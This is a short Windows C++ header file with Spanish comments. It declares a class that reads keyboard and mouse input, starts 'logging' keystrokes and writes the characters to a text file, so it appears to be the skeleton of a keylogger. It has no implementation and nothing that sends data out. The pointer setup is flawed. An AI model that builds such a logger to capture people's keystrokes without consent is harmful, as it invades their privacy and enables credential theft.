#include <Windows.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>

#pragma once

class Key {
private:
	char* keys; //variable que se usará para leer el teclado-mouse
public:
	char* SetKeys(char* _keys) { keys = _keys; return keys; } //asignar valor a variable keys.
	char* cKeys = keys; //asignar variable pública para obtener los valores de char 
						//no se usara funcion porque se necesitará el valor de character como puntero para obtener la ubicación del caracter a leer.
	void StartLogging(); //iniciar lectura de teclado
	void ConvertChar(char* c);//convertir de puntero a valor para escribir en archivo text.
};
